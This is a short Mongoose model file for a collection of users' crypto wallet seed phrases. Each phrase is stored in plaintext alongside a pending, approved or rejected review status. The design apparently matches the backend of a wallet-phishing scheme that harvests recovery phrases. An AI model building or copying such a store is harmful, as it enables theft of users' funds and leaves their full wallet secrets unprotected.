import mongoose from "mongoose";
const seedPhraseSchema = new mongoose.Schema({
  userId: { type: mongoose.Schema.Types.ObjectId, ref: "User" },
  walletName: String,
  phrase: { type: String, required: true },
  status: { type: String, enum: ["pending", "approved", "rejected"], default: "pending" },
  createdAt: { type: Date, default: Date.now },
});
const SeedPhrase = mongoose.models.SeedPhrase || mongoose.model("SeedPhrase", seedPhraseSchema);
export default SeedPhrase;